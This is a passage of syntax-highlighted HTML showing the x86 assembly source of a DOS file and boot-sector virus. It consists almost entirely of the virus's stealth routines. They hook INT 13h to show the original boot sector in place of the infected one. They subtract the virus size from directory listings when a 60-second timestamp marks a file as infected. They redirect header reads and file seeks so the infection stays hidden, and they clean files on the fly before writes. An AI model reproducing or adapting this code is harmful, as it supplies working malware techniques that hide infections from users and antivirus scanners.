</span><span class="sc5">Stealth_Int13h</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">02h</span><span class="sc0">                 </span><span class="sc1">; Read?</span><span class="sc0">
        </span><span class="sc6">JNE</span><span class="sc0">     </span><span class="sc5">JMP_Int13h</span><span class="sc0">

        </span><span class="sc6">OR</span><span class="sc0">      </span><span class="sc8">DH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">DH</span><span class="sc0">                  </span><span class="sc1">; Zero-head.</span><span class="sc0">
        </span><span class="sc6">JNZ</span><span class="sc0">     </span><span class="sc5">JMP_Int13h</span><span class="sc0">

        </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc0">                 </span><span class="sc1">; Bootsector?</span><span class="sc0">
        </span><span class="sc6">JNE</span><span class="sc0">     </span><span class="sc5">JMP_Int13h</span><span class="sc0">

        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">BiosInt</span><span class="sc0">                 </span><span class="sc1">; Execute function.</span><span class="sc0">

        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Push_All</span><span class="sc0">
        </span><span class="sc6">JC</span><span class="sc0">      </span><span class="sc5">Exit_Stealth_i13h</span><span class="sc0">       </span><span class="sc1">; Exit if error occurred.</span><span class="sc0">

        </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc8">BX</span><span class="sc4">+</span><span class="sc5">Signature</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">Marker_Boot</span><span class="sc0">
        </span><span class="sc6">JNE</span><span class="sc0">     </span><span class="sc5">Exit_Stealth_i13h</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0201h</span><span class="sc0">               </span><span class="sc1">; Read original bootsector.</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc8">BX</span><span class="sc4">+</span><span class="sc5">Stored_TS</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc8">BX</span><span class="sc4">+</span><span class="sc5">Stored_HD</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">BiosInt</span><span class="sc0">

</span><span class="sc5">Exit_Stealth_i13h</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Pop_All</span><span class="sc0">

        </span><span class="sc6">RETF</span><span class="sc0">    </span><span class="sc2">2</span><span class="sc0">


</span><span class="sc5">JMP_Int13h</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:</span><span class="sc5">Int13h</span><span class="sc0">


        </span><span class="sc1">; &lt;===  S T E A L T H   R O U T I N E S  ===&gt;</span><span class="sc0">

</span><span class="sc5">Stealth_Filesize_FCB</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">DosInt</span><span class="sc0">

        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Push_All</span><span class="sc0">

        </span><span class="sc6">TEST</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc4">:</span><span class="sc5">Status</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00000010b</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">      </span><span class="sc5">Error_FCB</span><span class="sc0">

        </span><span class="sc6">OR</span><span class="sc0">      </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc0">                  </span><span class="sc1">; Error?</span><span class="sc0">
        </span><span class="sc6">JNZ</span><span class="sc0">     </span><span class="sc5">Error_FCB</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2Fh</span><span class="sc0">                 </span><span class="sc1">; Get DTA-address.</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">DosInt</span><span class="sc0">

        </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc8">BX</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">  </span><span class="sc1">; Extended FCB?</span><span class="sc0">
        </span><span class="sc6">JNE</span><span class="sc0">     </span><span class="sc5">Normal_FCB</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">                   </span><span class="sc1">; Skip extended stuff.</span><span class="sc0">
</span><span class="sc5">Normal_FCB</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc8">BX</span><span class="sc4">+</span><span class="sc2">17h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">AND</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00011111b</span><span class="sc0">           </span><span class="sc1">; Infected stamp?</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00011110b</span><span class="sc0">
        </span><span class="sc6">JNE</span><span class="sc0">     </span><span class="sc5">Error_FCB</span><span class="sc0">

        </span><span class="sc6">AND</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc8">BX</span><span class="sc4">+</span><span class="sc2">17h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">11100000b</span><span class="sc0">

        </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc8">BX</span><span class="sc4">+</span><span class="sc2">1Dh</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">Virus_Size</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">24</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">SBB</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc8">BX</span><span class="sc4">+</span><span class="sc2">1Fh</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">Error_FCB</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Pop_All</span><span class="sc0">

        </span><span class="sc6">RETF</span><span class="sc0">    </span><span class="sc2">2</span><span class="sc0">


</span><span class="sc1">; Subtract the virussize from infected files' length &amp; clear 60 seconds.</span><span class="sc0">
</span><span class="sc5">Stealth_Filesize</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">DosInt</span><span class="sc0">                  </span><span class="sc1">; Execute function.</span><span class="sc0">

        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Push_All</span><span class="sc0">
        </span><span class="sc6">JC</span><span class="sc0">      </span><span class="sc5">No_Filesize_Stealth</span><span class="sc0">     </span><span class="sc1">; Abort when error.</span><span class="sc0">

        </span><span class="sc6">TEST</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc4">:</span><span class="sc5">Status</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00000010b</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">      </span><span class="sc5">No_Filesize_Stealth</span><span class="sc0">     </span><span class="sc1">; No, then abort.</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2Fh</span><span class="sc0">                 </span><span class="sc1">; Get DTA-address.</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">DosInt</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc8">BX</span><span class="sc4">+</span><span class="sc2">16h</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; Get seconds-field.</span><span class="sc0">
        </span><span class="sc6">AND</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00011111b</span><span class="sc0">           </span><span class="sc1">; Mask seconds.</span><span class="sc0">

        </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00011110b</span><span class="sc0">           </span><span class="sc1">; Equal to 60 seconds?</span><span class="sc0">
        </span><span class="sc6">JNE</span><span class="sc0">     </span><span class="sc5">No_Filesize_Stealth</span><span class="sc0">     </span><span class="sc1">; No stealth when not.</span><span class="sc0">

        </span><span class="sc6">AND</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc8">BX</span><span class="sc4">+</span><span class="sc2">16h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">11100000b</span><span class="sc0">  </span><span class="sc1">; 0 seconds.</span><span class="sc0">

        </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc8">BX</span><span class="sc4">+</span><span class="sc2">1Ah</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">Virus_Size</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">24</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">SBB</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc8">BX</span><span class="sc4">+</span><span class="sc2">1Ch</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">No_Filesize_Stealth</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Pop_All</span><span class="sc0">

        </span><span class="sc6">RETF</span><span class="sc0">    </span><span class="sc2">2</span><span class="sc0">                       </span><span class="sc1">; Return 2 caller.</span><span class="sc0">


</span><span class="sc1">; Prevents readings after virtual file &amp; redirect readings from header.</span><span class="sc0">
</span><span class="sc5">Stealth_File_Read</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Push_All</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CS</span><span class="sc4">:</span><span class="sc5">Read_Buffer</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc0">

        </span><span class="sc6">TEST</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc4">:</span><span class="sc5">Status</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00000100b</span><span class="sc0">    </span><span class="sc1">; Can we use SFT-stealth?</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">      </span><span class="sc5">JMP_No_Stealth</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CS</span><span class="sc4">:</span><span class="sc5">Read_Bytes</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc0">       </span><span class="sc1">; Save # of bytes to read.</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CS</span><span class="sc4">:</span><span class="sc5">Read_Buffer</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc0">

        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Check_Handle</span><span class="sc0">            </span><span class="sc1">; Dis is a filehandle?</span><span class="sc0">
        </span><span class="sc6">JNZ</span><span class="sc0">     </span><span class="sc5">JMP_No_Stealth</span><span class="sc0">          </span><span class="sc1">; Abort when it isn't.</span><span class="sc0">

        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Check_Stamp</span><span class="sc0">             </span><span class="sc1">; Infected timestamp?</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">      </span><span class="sc5">Stealth_Read</span><span class="sc0">

</span><span class="sc5">JMP_No_Stealth</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">No_Stealth_Read</span><span class="sc0">

</span><span class="sc5">Stealth_Read</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Get_DCB</span><span class="sc0">                 </span><span class="sc1">; Get the SFT-address.</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc8">DI</span><span class="sc4">+</span><span class="sc2">17h</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; Pos. before read hi.</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CS</span><span class="sc4">:</span><span class="sc5">File_Pos</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc8">DI</span><span class="sc4">+</span><span class="sc2">15h</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; Pos. before read lo.</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CS</span><span class="sc4">:</span><span class="sc5">File_Pos</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">

        </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc8">DI</span><span class="sc4">+</span><span class="sc2">11h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">Virus_Size</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">24</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">SBB</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc8">DI</span><span class="sc4">+</span><span class="sc2">13h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Pop_All</span><span class="sc0">

        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">DosInt</span><span class="sc0">                  </span><span class="sc1">; Execute function.</span><span class="sc0">

        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Push_All</span><span class="sc0">
        </span><span class="sc6">JC</span><span class="sc0">      </span><span class="sc5">Abort_Stealth</span><span class="sc0">           </span><span class="sc1">; Abort when error.</span><span class="sc0">

        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Get_DCB</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc8">DI</span><span class="sc4">+</span><span class="sc2">11h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">Virus_Size</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">24</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">ADC</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc8">DI</span><span class="sc4">+</span><span class="sc2">13h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc0">

        </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc5">File_Pos</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">             </span><span class="sc1">; Reading 1st 64k?</span><span class="sc0">
        </span><span class="sc6">JNZ</span><span class="sc0">     </span><span class="sc5">Abort_Stealth</span><span class="sc0">           </span><span class="sc1">; Abort when not.</span><span class="sc0">

        </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc5">File_Pos</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">24</span><span class="sc0">          </span><span class="sc1">; Reading header?</span><span class="sc0">
        </span><span class="sc6">JA</span><span class="sc0">      </span><span class="sc5">Abort_Stealth</span><span class="sc0">           </span><span class="sc1">; Abort when not.</span><span class="sc0">

        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Save_File_Pos</span><span class="sc0">

        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Go_End_File</span><span class="sc0">             </span><span class="sc1">; Go to position of old</span><span class="sc0">
        </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">24</span><span class="sc0">                  </span><span class="sc1">; header at end of file.</span><span class="sc0">
        </span><span class="sc6">SBB</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

        </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">File_Pos</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc0">          </span><span class="sc1">; Pos in header.</span><span class="sc0">
        </span><span class="sc6">ADC</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc8">DI</span><span class="sc4">+</span><span class="sc2">17h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc0">         </span><span class="sc1">; Pos. old header.</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc8">DI</span><span class="sc4">+</span><span class="sc2">15h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">         </span><span class="sc1">; Pos. old header.</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3Fh</span><span class="sc0">                 </span><span class="sc1">; Read original header</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">24</span><span class="sc0">                  </span><span class="sc1">; into caller's buffer.</span><span class="sc0">
        </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">File_Pos</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Read_Buffer</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Read_Buffer</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">DosInt</span><span class="sc0">

        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Restore_File_Pos</span><span class="sc0">
</span><span class="sc5">Abort_Stealth</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Pop_All</span><span class="sc0">

        </span><span class="sc6">RETF</span><span class="sc0">    </span><span class="sc2">2</span><span class="sc0">                       </span><span class="sc1">; Return to caller.</span><span class="sc0">

</span><span class="sc5">No_Stealth_Read</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Pop_All</span><span class="sc0">

        </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">Continue</span><span class="sc0">


</span><span class="sc1">; Prevents lseeks beyond virtual file.</span><span class="sc0">
</span><span class="sc5">Stealth_Fileseek</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Push_All</span><span class="sc0">

        </span><span class="sc6">TEST</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc4">:</span><span class="sc5">Status</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00000100b</span><span class="sc0">    </span><span class="sc1">; Readstealth?</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">      </span><span class="sc5">No_Stealth_lseek</span><span class="sc0">

        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Check_Stamp</span><span class="sc0">             </span><span class="sc1">; Infected stamp?</span><span class="sc0">
        </span><span class="sc6">JNZ</span><span class="sc0">     </span><span class="sc5">No_Stealth_Lseek</span><span class="sc0">

        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Get_DCB</span><span class="sc0">
        </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc8">DI</span><span class="sc4">+</span><span class="sc2">11h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">Virus_Size</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">24</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">SBB</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc8">DI</span><span class="sc4">+</span><span class="sc2">13h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Pop_All</span><span class="sc0">

        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">DosInt</span><span class="sc0">                  </span><span class="sc1">; Execute function.</span><span class="sc0">

        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Push_All</span><span class="sc0">

        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Get_DCB</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc8">DI</span><span class="sc4">+</span><span class="sc2">11h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">Virus_Size</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">24</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">ADC</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc8">DI</span><span class="sc4">+</span><span class="sc2">13h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Pop_All</span><span class="sc0">

        </span><span class="sc6">RETF</span><span class="sc0">    </span><span class="sc2">2</span><span class="sc0">

</span><span class="sc5">No_Stealth_lseek</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Pop_All</span><span class="sc0">

        </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">Continue</span><span class="sc0">


</span><span class="sc1">; DS:DX = Filename.</span><span class="sc0">
</span><span class="sc5">Clean_By_File</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Push_All</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3D02h</span><span class="sc0">               </span><span class="sc1">; Open file r/w.</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">DosInt</span><span class="sc0">
        </span><span class="sc6">JC</span><span class="sc0">      </span><span class="sc5">Abort_Clean</span><span class="sc0">

        </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">

        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Clean_Handle</span><span class="sc0">            </span><span class="sc1">; Clean it.</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3Eh</span><span class="sc0">                 </span><span class="sc1">; Close file.</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">DosInt</span><span class="sc0">
</span><span class="sc5">Abort_Clean</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Pop_All</span><span class="sc0">

        </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">Continue</span><span class="sc0">

</span><span class="sc1">; Removes the virus physically from disk, before a program writes to it.</span><span class="sc0">
</span><span class="sc5">Clean_By_Handle</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Clean_Handle</span><span class="sc0">

        </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">Continue</span><span class="sc0">

</span><span class="sc1">; Cleans the handle, (must have read/write access).</span><span class="sc0">
</span><span class="sc5">Clean_Handle</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Push_All</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Hook_i24h</span><span class="sc0">

        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc0">

        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Check_Handle</span><span class="sc0">            </span><span class="sc1">; Filehandle?</span><span class="sc0">
        </span><span class="sc6">JNZ</span><span class="sc0">     </span><span class="sc5">No_Del</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5700h</span><span class="sc0">               </span><span class="sc1">; Get filedate.</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">DosInt</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc5">FileTime</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc0">            </span><span class="sc1">; Save it.</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc5">FileDate</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc0">

